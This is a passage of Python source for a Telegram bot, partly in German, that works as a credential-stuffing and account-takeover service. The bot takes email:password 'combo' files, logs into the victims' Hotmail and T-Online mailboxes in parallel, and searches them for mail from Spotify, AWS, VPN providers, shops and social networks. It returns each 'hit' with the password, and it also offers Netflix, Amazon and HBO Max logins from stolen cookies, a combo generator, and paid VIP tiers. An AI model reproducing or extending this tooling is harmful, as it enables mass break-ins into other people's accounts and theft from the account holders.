
    elif text == "🎵 Spotify Inboxen":
        user_sessions[user_id] = {"mode": "inbox_spotify", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎵 <b>SPOTIFY INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>no-reply@spotify.com</code>\n"
            "• 🎧 Account & subscription info\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🎵 Spotify Premium Inbox":
        user_sessions[user_id] = {"mode": "inbox_spotify_premium", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎵 <b>SPOTIFY PREMIUM INBOX</b>\n\n"
            "Logs into each email account and checks for Spotify Premium:\n"
            "• 💎 Individual Premium\n"
            "• 👨‍👩‍👧 Family Plan\n"
            "• 👫 Duo Plan\n"
            "• 🎓 Student Premium\n\n"
            "⚠️ Only <b>Premium accounts</b> are reported as hits!\n"
            "Free accounts are skipped automatically.\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML'
        )

    elif text == "✅ Check24 Inboxen":
        user_sessions[user_id] = {"mode": "inbox_check24", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "✅ <b>CHECK24 INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@check24.de</code>\n"
            "• Emails from <code>info@check24.de</code>\n"
            "• 📋 Contract & order numbers\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "👠 SHEIN Inboxen":
        user_sessions[user_id] = {"mode": "inbox_shein", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "👠 <b>SHEIN INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@sheinnotice.com</code>\n"
            "• 🛍️ Order numbers\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🚌 FlixBus Inboxen":
        user_sessions[user_id] = {"mode": "inbox_flixbus", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🚌 <b>FLIXBUS INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@flixbus.com</code>\n"
            "• Emails from <code>booking@flixbus.com</code>\n"
            "• 🎫 Booking numbers\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "🍾 Flaschenpost Inboxen":
        user_sessions[user_id] = {"mode": "inbox_flaschenpost", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🍾 <b>FLASCHENPOST INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@flaschenpost.de</code>\n"
            "• Emails from <code>info@flaschenpost.de</code>\n"
            "• 📦 Order numbers\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text == "⚔️ Supercell Inboxen":
        user_sessions[user_id] = {"mode": "inbox_supercell", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "⚔️ <b>SUPERCELL INBOX</b>\n\n"
            "Checks email combos for Supercell accounts.\n\n"
            "✅ <b>Hit includes:</b>\n"
            "• 🎮 Linked games detected (CoC, CR, BS, etc.)\n"
            "• 🏷️ Player tags extracted from emails\n"
            "• 📨 Total Supercell emails found\n"
            "• 💳 Payment method (if present)\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML'
        )

    elif text == "🔒 VPN Inboxen":
        user_sessions[user_id] = {"mode": "inbox_vpn", "step": "waiting_combo"}
        bot.send_message(message.chat.id,
            "🔒 <b>VPN INBOX</b>\n\n"
            "Scans combos for <b>any</b> VPN subscription.\n\n"
            "🌍 <b>Covered providers:</b>\n"
            "• NordVPN, ExpressVPN, Surfshark\n"
            "• ProtonVPN, Mullvad, CyberGhost\n"
            "• IPVanish, PIA, Windscribe, TunnelBear\n"
            "• PureVPN, VyprVPN, HMA, Atlas VPN\n"
            "• Hotspot Shield + more\n\n"
            "✅ <b>Hit shows:</b> Provider • Plan • Expiry • Payment\n\n"
            "📁 Send your combo file (email:password)\n\n"
            f"💎 {MY_SIGNATURE}", parse_mode='HTML')

    elif text == "🌐 Hosting Inboxen":
        user_sessions[user_id] = {"mode": "inbox_hosting", "step": "waiting_combo"}
        bot.send_message(message.chat.id,
            "🌐 <b>HOSTING INBOX</b>\n\n"
            "Scans combos for web hosting accounts.\n\n"
            "🏢 <b>Covered providers:</b>\n"
            "• GoDaddy, Bluehost, HostGator\n"
            "• SiteGround, DreamHost, Namecheap\n"
            "• Ionos/1&1, Hetzner, OVH\n"
            "• Cloudflare, DigitalOcean, Vultr\n"
            "• Linode/Akamai + more\n\n"
            "✅ <b>Hit shows:</b> Provider • Plan • Domains • Payment\n\n"
            "📁 Send your combo file (email:password)\n\n"
            f"💎 {MY_SIGNATURE}", parse_mode='HTML')

    elif text == "☁️ AWS Inboxen":
        user_sessions[user_id] = {"mode": "inbox_aws", "step": "waiting_combo"}
        bot.send_message(message.chat.id,
            "☁️ <b>AWS INBOX</b>\n\n"
            "Scans combos for Amazon Web Services accounts.\n\n"
            "✅ <b>Hit shows:</b>\n"
            "• 🖥️ Services used (EC2, S3, Lambda, RDS...)\n"
            "• 💰 Billing amounts found\n"
            "• 🔑 Account ID (if found)\n"
            "• 📨 Number of AWS emails\n\n"
            "📁 Send your combo file (email:password)\n\n"
            f"💎 {MY_SIGNATURE}", parse_mode='HTML')

    elif text == "📸 Instagram Checker":
        user_sessions[user_id] = {"mode": "check_instagram_direct", "step": "waiting_combo"}
        bot.send_message(message.chat.id,
            "📸 <b>INSTAGRAM CHECKER</b>\n\n"
            "Directly checks Instagram email:password combos.\n\n"
            "✅ <b>Hit shows:</b>\n"
            "• 👤 Username & full name\n"
            "• 👥 Followers / Following / Posts\n"
            "• ✅ Verified / 🔒 Private status\n"
            "• 📝 Bio & 🌍 Country\n"
            "• 🔐 2FA status\n\n"
            "📁 Send your combo file (email:password)\n\n"
            f"💎 {MY_SIGNATURE}", parse_mode='HTML')

    elif text == "🎵 TikTok Checker":
        user_sessions[user_id] = {"mode": "check_tiktok_direct", "step": "waiting_combo"}
        bot.send_message(message.chat.id,
            "🎵 <b>TIKTOK CHECKER</b>\n\n"
            "Directly checks TikTok email:password combos.\n\n"
            "✅ <b>Hit shows:</b>\n"
            "• 👤 Username & display name\n"
            "• 👥 Followers / Following / Videos\n"
            "• ❤️ Likes / 🌍 Country\n"
            "• ✅ Verified / 🔒 Private status\n"
            "• 📝 Bio & 📅 Created date\n\n"
            "📁 Send your combo file (email:password)\n\n"
            f"💎 {MY_SIGNATURE}", parse_mode='HTML')

    elif text == "🍔 McDonald's Inboxen":
        user_sessions[user_id] = {"mode": "inbox_mcdonalds", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🍔 <b>McDONALD'S INBOX</b>\n\n"
            "Checks combos for:\n"
            "• Emails from <code>noreply@mcdonalds.de</code>\n"
            "• Emails from <code>mcdonalds@email.mcdonalds.com</code>\n"
            "• 📦 Order numbers\n"
            "• Stored payment method\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif text in ("🍿 Netflix Cookie Login", "📦 Amazon Cookie Login", "🎬 HBO Max Cookie Login"):
        service_map = {
            "🍿 Netflix Cookie Login": ("netflix", "Netflix"),
            "📦 Amazon Cookie Login": ("amazon", "Amazon"),
            "🎬 HBO Max Cookie Login": ("hbomax", "HBO Max"),
        }
        svc_key, svc_name = service_map[text]
        user_sessions[user_id] = {"mode": "cookie_login", "service": svc_key, "step": "waiting_cookie"}
        bot.send_message(
            message.chat.id,
            f"🍪 <b>{svc_name} Cookie Login</b>\n\n"
            "Paste your cookie string below or send a <code>.txt</code> / <code>.json</code> file.\n\n"
            "<b>Supported formats:</b>\n"
            "• <code>name=value; name2=value2</code> (browser copy)\n"
            "• Netscape cookie file (<code>cookies.txt</code>)\n"
            "• JSON array (<code>[{&quot;name&quot;:&quot;...&quot;,&quot;value&quot;:&quot;...&quot;}]</code>)\n\n"
            "📤 Send cookies now:",
            parse_mode='HTML'
        )

    elif text == "🎵 TikTok Inboxen":
        user_sessions[user_id] = {"mode": "inbox_tiktok", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎵 <b>TIKTOK INBOX</b>\n\n"
            "Checks email combos for TikTok accounts.\n\n"
            "✅ <b>Hit includes:</b>\n"
            "• 👥 Followers / 👣 Following\n"
            "• 📹 Videos / ❤️ Likes\n"
            "• 🌍 Country / 📝 Bio\n"
            "• 📅 Created date\n"
            "• ✅ Verified / 🔒 Private status\n"
            "• 📸 Profile picture sent as photo\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML'
        )

    elif text == "🎵 TikTok 1K+ Inboxen":
        user_sessions[user_id] = {"mode": "inbox_tiktok_1k", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "🎵 <b>TIKTOK 1K+ INBOX</b>\n\n"
            "Checks email combos for TikTok accounts with <b>1000+ followers</b>.\n\n"
            "✅ <b>Hit criteria: ≥ 1,000 followers</b>\n\n"
            "📊 <b>Hit includes:</b>\n"
            "• 👥 Followers / 👣 Following\n"
            "• 📹 Videos / ❤️ Likes\n"
            "• 🌍 Country / 📝 Bio\n"
            "• 📅 Created date\n"
            "• ✅ Verified / 🔒 Private status\n"
            "• 📸 Profile picture sent as photo\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML'
        )

    elif text == "📸 Instagram Inboxen":
        user_sessions[user_id] = {"mode": "inbox_instagram", "step": "waiting_combo"}
        bot.send_message(
            message.chat.id,
            "📸 <b>INSTAGRAM INBOX</b>\n\n"
            "Checks email combos for Instagram accounts.\n\n"
            "✅ <b>Hit includes:</b>\n"
            "• 👥 Followers / 👣 Following\n"
            "• 🖼️ Posts count\n"
            "• 🌍 Country / 📝 Bio\n"
            "• 📅 Join date\n"
            "• ✅ Verified / 🔒 Private status\n"
            "• 📸 Profile picture sent as photo\n\n"
            "📁 Send your combo file now!\n"
            "Format: <code>email:password</code>\n\n"
            f"💎 {MY_SIGNATURE}",
            parse_mode='HTML'
        )

    elif _btn_match("btn_mail_extractor") or text == "📧 Mail Extractor":
        user_sessions[user_id] = {"mode": "mail_extractor"}
        bot.send_message(
            message.chat.id,
            "📧 <b>MAIL EXTRACTOR</b>\n\n"
            "Send me your combo file (.txt)\n\n"
            "I will return only the <b>valid email addresses</b>.\n\n"
            "📁 Format: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif _btn_match("btn_combo_gen") or text in ("🔀 Combo Generator",):
        user_sessions[user_id] = {"mode": "combo_gen", "step": "waiting_emails"}
        bot.send_message(
            message.chat.id,
            "🔀 <b>COMBO GENERATOR</b>\n\n"
            "Creates combos from an email list + password list.\n\n"
            "📧 <b>Step 1:</b> Send me the <b>email list</b> (.txt)\n"
            "One email per line:\n"
            "<code>user1@hotmail.com\nuser2@t-online.de\nuser3@freenet.de</code>",
            parse_mode='HTML'
        )

    elif text == "🔑 Redeem Key" or (text and text.startswith("/redeem")):
        user_sessions[user_id] = {"mode": "redeem_code"}
        bot.send_message(
            message.chat.id,
            "🔑 <b>REDEEM KEY</b>\n\n"
            "Send your redeem code:",
            parse_mode='HTML'
        )

    elif text == "🏆 Leaderboard":
        top_users = get_leaderboard()
        if not top_users:
            bot.send_message(message.chat.id, "Noch keine User!")
        else:
            msg = "🏆 <b>TOP 10 LEADERBOARD</b>\n\n"
            medals = ["🥇", "🥈", "🥉"]
            for i, u in enumerate(top_users, 1):
                medal = medals[i-1] if i <= 3 else f"{i}."
                name = u.get('name', 'User')
                hits = u.get('total_hits', 0)
                msg += f"{medal} {name} - {hits} hits\n"
            msg += f"\n━━━━━━━━━━━━━━━━━━━━━━━━━━\n💎 {MY_SIGNATURE}"
            bot.send_message(message.chat.id, msg, parse_mode='HTML')

    elif text == "🎁 Daily Claim":
        success, msg_text = claim_daily(user_id)
        bot.send_message(message.chat.id, msg_text)

    elif _btn_match("btn_combo_cleaner") or text == "🧹 Combo Cleaner":
        user_sessions[user_id] = {"mode": "combo_cleaner"}
        bot.send_message(
            message.chat.id,
            "🧹 <b>COMBO CLEANER</b>\n\n"
            "Send me your combo file (.txt)\n\n"
            "I will remove:\n"
            "✅ Duplicates\n"
            "✅ Invalid lines (missing email:pass)\n"
            "✅ Empty lines\n"
            "✅ Invalid email formats\n\n"
            "📁 Format must be: <code>email:password</code>",
            parse_mode='HTML'
        )

    elif _btn_match("btn_admin") or text in ("🔧 Admin Panel",):
        if user_id != ADMIN_ID:
            bot.send_message(message.chat.id, t(user_id, "access_denied"), parse_mode='HTML')
            return
        bot.send_message(message.chat.id, t(user_id, "admin_panel"),
                        parse_mode='HTML', reply_markup=admin_panel_keyboard())

# ── Multi-part upload: Start Scan / Cancel handlers ───────────────────────

@bot.callback_query_handler(func=lambda call: call.data.startswith('mp_start_') or call.data.startswith('mp_cancel_'))
def handle_multipart_callback(call):
    uid_str = call.data.split('_', 2)[2]
    try:
        owner_id = int(uid_str)
    except ValueError:
        bot.answer_callback_query(call.id, "❌ Invalid request.", show_alert=True)
        return

    if call.from_user.id != owner_id:
        bot.answer_callback_query(call.id, "❌ This is not your scan.", show_alert=True)
        return

    sess = user_sessions.get(owner_id, {})

    if call.data.startswith('mp_cancel_'):
        user_sessions.pop(owner_id, None)
        bot.answer_callback_query(call.id, "🗑 Cleared.", show_alert=False)
        try:
            bot.edit_message_text("🗑 <b>Combo cleared.</b> Send a new file or use the menu.",
                                  call.message.chat.id, call.message.message_id, parse_mode='HTML')
        except:
            pass
        return

    # ── mp_start_ ─────────────────────────────────────────────────────────
    combos   = sess.get("accumulated_combos", [])
    services = sess.get("services", [])
    total    = len(combos)

    if total == 0:
        bot.answer_callback_query(call.id, "❌ No combos accumulated.", show_alert=True)
        return

    if not start_scan(owner_id):
        bot.answer_callback_query(call.id, "⚠️ You already have an active scan!", show_alert=True)
        return

    bot.answer_callback_query(call.id, f"🚀 Starting scan for {total:,} lines…")

    services_display = ", ".join(services)

    try:
        bot.edit_message_text(
            f"🚀 <b>Scan starting…</b>\n📊 <b>{total:,}</b> lines | 📬 <b>{services_display}</b>",
            call.message.chat.id, call.message.message_id, parse_mode='HTML'
        )
    except:
        pass

    progress_msg = bot.send_message(
        call.message.chat.id,
        f"🔍 <b>Inbox Scan Started!</b>\n\n"
        f"📬 Services: <b>{services_display}</b>\n"
        f"📥 Accounts: <b>{total:,}</b>\n\n"
        f"⏳ Please wait...",
        parse_mode='HTML',
        reply_markup=stop_scan_keyboard(owner_id)
    )

    hits       = []
    bads       = []
    no_inbox   = []
    errors_list = []
    checked    = [0]
    lock       = threading.Lock()
    _chat_id   = call.message.chat.id
    _pm_id     = progress_msg.message_id

    def _mp_check_one(combo):
        email_addr, password = combo
        if not active_scans.get(owner_id, False):
            return
        try:
            result, provider = check_account_auto(email_addr, password)
            if result.get("status") == "RETRY":
                result, provider = check_account_auto(email_addr, password)
            status = result.get("status", "RETRY")
            if status == "BAD":
                with lock:
                    checked[0] += 1
                    bads.append(f"{email_addr}:{password}")
                return
            if status != "HIT":
                with lock:
                    checked[0] += 1
                    errors_list.append(f"{email_addr}:{password} | {status}")
                return
            found_services = []
            for svc in services:
                svc_lower = svc.lower().strip()
                found = False
                known = KNOWN_SERVICE_SENDERS.get(svc_lower, [])
                if provider == "tonline":
                    if known:
                        for sender in known:
                            if TOnlineChecker.search_inbox(email_addr, password, sender):
                                found = True; break
                    else:
                        if TOnlineChecker.search_inbox(email_addr, password, svc_lower):
                            found = True
                else:
                    token = result.get("token", "")
                    cid   = result.get("cid", "")
                    if known:
                        for sender in known:
                            if _inbox_search_hotmail(token, cid, f'from:"{sender}"'):
                                found = True; break
                    else:
                        for q in [f'from:"{svc_lower}.com"', f'from:"{svc_lower}.de"']:
                            if _inbox_search_hotmail(token, cid, q):
                                found = True; break
                if found:
                    found_services.append(svc)
            with lock:
                checked[0] += 1
                if found_services:
                    hits.append(f"{email_addr}:{password} | {', '.join(found_services)}")
                else:
                    no_inbox.append(f"{email_addr}:{password}")
            if found_services:
                try:
                    svc_text = "\n".join([f"✅ {s}" for s in found_services])
                    bot.send_message(
                        owner_id,
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"📬 <b>INBOX HIT #{len(hits)}</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📧 Email: <code>{email_addr}</code>\n"
                        f"🔑 Password: <code>{password}</code>\n\n"
                        f"🔗 <b>Found Services:</b>\n{svc_text}\n\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n"
                        f"💎 {MY_SIGNATURE}",
                        parse_mode='HTML'
                    )
                except:
                    pass
        except Exception as e:
            with lock:
                checked[0] += 1
                errors_list.append(f"{email_addr}:{password} | ERROR")

    def _mp_progress():
        last = -1
        while checked[0] < total and active_scans.get(owner_id, False):
            if checked[0] != last:
                last = checked[0]
                try:
                    bot.edit_message_text(
                        f"🔍 <b>Inbox Scan Running...</b>\n\n"
                        f"📬 Services: <b>{services_display}</b>\n"
                        f"📊 Progress: <b>{checked[0]}/{total}</b>\n"
                        f"✅ Hits: <b>{len(hits)}</b> | ❌ Bad: <b>{len(bads)}</b> | 📭 No Match: <b>{len(no_inbox)}</b>",
                        _chat_id, _pm_id, parse_mode='HTML',
                        reply_markup=stop_scan_keyboard(owner_id)
                    )
                except:
                    pass

    def _mp_scan_thread():
        try:
            threading.Thread(target=_mp_progress, daemon=True).start()
            with concurrent.futures.ThreadPoolExecutor(max_workers=60) as executor:
                executor.map(_mp_check_one, combos)
            end_scan(owner_id)
            try:
                bot.delete_message(_chat_id, _pm_id)
            except:
                pass
            summary = (
                f"━━━━━━━━━━━━━━━━━━━━\n"
                f"📬 <b>INBOX SCAN {'⏹ STOPPED' if checked[0] < total else 'COMPLETED'}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🔎 <b>Services:</b> {services_display}\n"
                f"📊 <b>Checked:</b> {checked[0]}/{total}\n"
                f"✅ <b>Hits:</b> {len(hits)}\n"
                f"📭 <b>No Match:</b> {len(no_inbox)}\n"
                f"❌ <b>Bad:</b> {len(bads)}\n"
                f"🔄 <b>Errors:</b> {len(errors_list)}\n\n"
                f"💎 {MY_SIGNATURE}"
            )
            bot.send_message(_chat_id, summary, parse_mode='HTML')
            all_lines = []
            if hits:
                all_lines.append("═══ HITS ═══"); all_lines.extend(hits)
            if no_inbox:
                all_lines.append("\n═══ NO MATCH ═══"); all_lines.extend(no_inbox)
            if bads:
                all_lines.append("\n═══ BAD ═══"); all_lines.extend(bads)
            if errors_list:
                all_lines.append("\n═══ ERRORS ═══"); all_lines.extend(errors_list)
            if all_lines:
                send_large_document(
                    owner_id,
                    "\n".join(all_lines).encode('utf-8'),
                    f"INBOX_{len(hits)}hits_{total}total.txt",
                    caption=f"📬 <b>Inbox Results — {services_display}</b>\n"
                            f"✅ {len(hits)} Hits | ❌ {len(bads)} Bad | 📭 {len(no_inbox)} No Match\n\n"
                            f"💎 {MY_SIGNATURE}"
                )
        except Exception as e:
            try:
                bot.send_message(_chat_id, f"❌ Scan error: {str(e)}")
            except:
                pass
        finally:
            user_sessions.pop(owner_id, None)
            end_scan(owner_id)

    threading.Thread(target=_mp_scan_thread, daemon=True).start()


# Handle Callback Queries
@bot.callback_query_handler(func=lambda call: True)
def callback_handler(call):
    user_id = call.from_user.id

    # Check if banned
    if is_banned(user_id):
        bot.answer_callback_query(call.id, "❌ You are banned!", show_alert=True)
        return

    if call.data.startswith("set_lang_"):
        lang = call.data.replace("set_lang_", "")
        set_lang(user_id, lang)
        bot.answer_callback_query(call.id, "✅")
        bot.edit_message_text(t(user_id, "language_changed"),
                             call.message.chat.id, call.message.message_id, parse_mode='HTML')
        bot.send_message(call.message.chat.id, t(user_id, "reload",
                        admin_badge="🔧 ADMIN" if user_id == ADMIN_ID else "",
                        first_name=call.from_user.first_name or "User",
                        user_id=user_id,
                        vip_status='👑 VIP' if is_vip(user_id) else 'Free',
                        points=0, signature=MY_SIGNATURE),
                        parse_mode='HTML', reply_markup=main_menu_keyboard(user_id))
        return

    if call.data.startswith("admin_") and user_id != ADMIN_ID:
        bot.answer_callback_query(call.id, "❌ Access Denied! Admin only.", show_alert=True)
        return

    # VIP Required
    if call.data == "vip_required":
        bot.answer_callback_query(call.id, "👑 VIP membership required!", show_alert=True)
        return

    # VIP Forever Required (for TikTok)
    if call.data == "vip_forever_required":
        bot.answer_callback_query(call.id, "👑 VIP Forever membership required for TikTok Full Capture!", show_alert=True)
        return

    # Stop Scan
    if call.data.startswith("stop_scan_"):
        scan_user_id = int(call.data.replace("stop_scan_", ""))
        if scan_user_id == user_id or user_id == ADMIN_ID:
            if scan_user_id in active_scans:
                active_scans[scan_user_id] = False
                bot.answer_callback_query(call.id, "⏹ Scan stopped!", show_alert=True)
            else:
                bot.answer_callback_query(call.id, "No active scan found", show_alert=True)
        return

    # Scan Mode Selection
    if call.data.startswith("scan_"):
        mode = call.data.replace("scan_", "")

        # Handle single platform selection
        if mode == "single_platform":
            bot.edit_message_text(
                "🎯 <b>Select Single Platform</b>\n\n"
                "Choose ONE platform to check:",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML',
                reply_markup=single_platform_keyboard()
            )
            return

        # Store mode
        user_sessions[user_id] = {"mode": mode}

        description = get_mode_description(mode)

        if mode == "custom":
            bot.edit_message_text(
                description +
                f"\n\n📝 <b>Send the domain name:</b>\n"
                f"Example: netflix.com",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )
            user_sessions[user_id]["step"] = "waiting_custom_domain"
        else:
            bot.edit_message_text(
                description +
                f"\n\n📁 <b>Now send your combo file</b>\n"
                f"Format: email:password",
                call.message.chat.id,
                call.message.message_id,
                parse_mode='HTML'
            )

    # Platform Selection (for single platform mode)
    if call.data.startswith("platform_"):
        platform_name = call.data.replace("platform_", "")

        # Store mode as "single" and the platform
        user_sessions[user_id] = {
            "mode": "single",
            "platform": platform_name
        }

        bot.edit_message_text(
            f"✅ <b>Selected: {platform_name}</b>\n\n"
            f"Will check {platform_name} only!\n\n"
            f"📁 <b>Now send combo file</b>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )
        return

    # Back to scan modes
    if call.data == "back_to_scan_modes":
        bot.edit_message_text(
            "⚡ <b>SELECT SCAN MODE</b>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=scan_mode_keyboard(user_id)
        )
        return

    # Admin Panel Callbacks
    elif call.data == "admin_panel":
        bot.edit_message_text(
            "🔧 <b>ADMIN PANEL</b>\n\nSelect an option:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=admin_panel_keyboard()
        )

    elif call.data == "admin_add_vip":
        user_sessions[user_id] = {"mode": "admin_add_vip", "step": "waiting_id"}
        bot.edit_message_text(
            "➕ <b>ADD VIP MEMBER</b>\n\n"
            "Sende die User ID:\n\n"
            "Beispiel: <code>123456789</code>",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_remove_vip":
        user_sessions[user_id] = {"mode": "admin_remove_vip"}
        bot.edit_message_text(
            "➖ <b>REMOVE VIP</b>\n\n"
            "Sende die User ID:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_list_vips":
        vips = get_all_vips()

        if not vips:
            vip_text = "📋 <b>VIP MEMBERS</b>\n\n❌ No VIP members"
        else:
            vip_text = "📋 <b>VIP MEMBERS</b>\n\n"
            for i, vip in enumerate(vips, 1):
                vip_text += f"{i}. <code>{vip[0]}</code> @{vip[1] or 'N/A'}\n"
                vip_text += f"   Until: {vip[2]}\n\n"

        bot.edit_message_text(vip_text, 
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())

    elif call.data == "admin_ban_user":
        user_sessions[user_id] = {"mode": "admin_ban_user"}
        bot.edit_message_text(
            "🚫 <b>BAN USER</b>\n\n"
            "Sende die User ID:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_unban_user":
        user_sessions[user_id] = {"mode": "admin_unban_user"}
        bot.edit_message_text(
            "✅ <b>UNBAN USER</b>\n\n"
            "Sende die User ID:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_banned_list":
        banned = get_banned_users()

        if not banned:
            ban_text = "📋 <b>BANNED USERS</b>\n\n❌ No banned users"
        else:
            ban_text = "📋 <b>BANNED USERS</b>\n\n"
            for i, user in enumerate(banned, 1):
                ban_text += f"{i}. <code>{user[0]}</code> @{user[1] or 'N/A'}\n"
                ban_text += f"   Reason: {user[2] or 'N/A'}\n\n"

        bot.edit_message_text(ban_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=admin_panel_keyboard())

    elif call.data == "admin_stats":
        conn = get_db()
        c = conn.cursor()

        c.execute("SELECT COUNT(*) FROM users")
        total_users = c.fetchone()[0]

        c.execute("SELECT COUNT(*) FROM users WHERE is_vip = 1")
        total_vips = c.fetchone()[0]

        c.execute("SELECT COUNT(*) FROM users WHERE is_banned = 1")
        total_banned = c.fetchone()[0]

        c.execute("SELECT SUM(total_scans) FROM users")
        total_scans = c.fetchone()[0] or 0

        c.execute("SELECT SUM(total_hits) FROM users")
        total_hits = c.fetchone()[0] or 0

        conn.close()

        # Create buttons for viewing users
        markup = types.InlineKeyboardMarkup(row_width=2)
        btn1 = types.InlineKeyboardButton("📋 View Free Users", callback_data="view_free_users")
        btn2 = types.InlineKeyboardButton("👑 View VIP Users", callback_data="view_vip_users")
        btn3 = types.InlineKeyboardButton("🚫 View Banned Users", callback_data="admin_banned_list")
        btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        markup.add(btn1, btn2, btn3, btn_back)

        stats_text = f"""
📊 <b>BOT STATISTICS</b>

👥 <b>Users:</b>
• Total: {total_users}
• Free: {total_users - total_vips - total_banned}
• VIP: {total_vips}
• Banned: {total_banned}

📈 <b>Activity:</b>
• Total Scans: {total_scans}
• Total Hits: {total_hits}

💎 <b>Created by {MY_SIGNATURE}</b>
"""

        bot.edit_message_text(stats_text,
                            call.message.chat.id,
                            call.message.message_id,
                            parse_mode='HTML',
                            reply_markup=markup)

    elif call.data == "admin_broadcast":
        # Broadcast menu
        markup = types.InlineKeyboardMarkup(row_width=1)
        btn1 = types.InlineKeyboardButton("📤 Send to All Users", callback_data="broadcast_all")
        btn2 = types.InlineKeyboardButton("👤 Send to One User", callback_data="broadcast_one")
        btn_back = types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")
        markup.add(btn1, btn2, btn_back)

        bot.edit_message_text(
            "📢 <b>BROADCAST MESSAGE</b>\n\n"
            "Choose broadcast type:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML',
            reply_markup=markup
        )

    elif call.data == "broadcast_all":
        user_sessions[user_id] = {"mode": "admin_broadcast_all"}
        bot.edit_message_text(
            "📤 <b>BROADCAST AN ALLE</b>\n\n"
            "Sende die Nachricht:\n\n"
            "⚠️ Wird an ALLE User gesendet!",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "broadcast_one":
        user_sessions[user_id] = {"mode": "admin_broadcast_one", "step": "waiting_id"}
        bot.edit_message_text(
            "👤 <b>AN EINEN USER SENDEN</b>\n\n"
            "Sende die User ID:",
            call.message.chat.id,
            call.message.message_id,
            parse_mode='HTML'
        )

    elif call.data == "admin_user_stats":
        all_stats = get_all_stats()
        if not all_stats:
            bot.edit_message_text(
                t(user_id, "user_stats_empty"),
                call.message.chat.id, call.message.message_id, parse_mode='HTML',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
            return

        entries = []
        sorted_users = sorted(all_stats.items(), key=lambda x: x[1].get("total_scans", 0), reverse=True)
        for uid, data in sorted_users[:15]:
            uname = data.get("username", "N/A") or "N/A"
            scans = data.get("total_scans", 0)
            hits = data.get("total_hits", 0)
            inbox = data.get("inbox_checks", 0)
            last = data.get("last_active", "N/A") or "N/A"
            entries.append(t(user_id, "user_stats_entry",
                           uid=uid, username=uname, scans=scans, hits=hits, inbox=inbox, last_active=last))

        stats_text = t(user_id, "user_stats_title") + "\n\n" + "\n\n".join(entries)
        markup = types.InlineKeyboardMarkup()
        markup.add(types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel"))
        bot.edit_message_text(stats_text, call.message.chat.id, call.message.message_id,
                             parse_mode='HTML', reply_markup=markup)

    elif call.data == "admin_top_users":
        top = get_top_users(10, "total_scans")
        if not top:
            bot.edit_message_text(
                t(user_id, "user_stats_empty"),
                call.message.chat.id, call.message.message_id, parse_mode='HTML',
                reply_markup=types.InlineKeyboardMarkup().add(
                    types.InlineKeyboardButton("◀️ Back", callback_data="admin_panel")))
            return

        entries = []
        for i, (uid, data) in enumerate(top, 1):
            medal = "🥇" if i == 1 else "🥈" if i == 2 else "🥉" if i == 3 else f"{i}."
            uname = data.get("username", "N/A") or "N/A"
            scans = data.get("total_scans", 0)
            hits = data.get("total_hits", 0)
